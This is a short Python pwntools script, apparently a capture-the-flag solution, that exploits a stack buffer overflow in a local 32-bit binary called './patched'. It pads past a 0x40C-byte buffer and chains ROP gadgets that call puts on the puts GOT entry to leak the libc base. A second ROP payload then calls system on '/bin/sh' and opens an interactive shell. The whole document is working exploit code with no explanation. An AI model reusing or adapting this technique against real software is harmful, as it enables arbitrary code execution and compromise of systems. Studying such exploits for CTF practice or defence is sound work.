from pwn import *

if __name__ == "__main__":
    puts_got = 0x804A018 
    puts = 0x80485D0
    read = 0x8048580
    infloop = 0x80487B0
    bof = 0x8048790

    libc = ELF("./local_libc")
    p = process("./patched")
    #gdb.attach(p,gdbscript="b *0x080487AF")
    pr = 0x080486a3 # pop_ebp
    ppr = 0x080486a2
    pppr = 0x080488bd

    pay = "x"*0x40C
    pay += p32(puts)+p32(pr)+p32(puts_got) # leak libc
    pay += p32(read)+p32(pppr)+p32(0)+p32(puts_got)+p32(4)
    pay += p32(infloop)

    p.send(pay)

    while True:
        data = p.recvline()
        if data!="Sand is leaking\n":
            LIBC = u32(data[:4]) - libc.symbols['puts']
            break
    
    log.info("LIBC: 0x%x"%LIBC)

    p.send(p32(bof))

    # second ROP
    binsh_addr = LIBC + 0x17e0cf
    system = LIBC + libc.symbols['system']

    pay ="AAAA"*(0xF2)
    pay += p32(system)+p32(0)+p32(binsh_addr)
    
    p.send(pay)
    p.interactive()
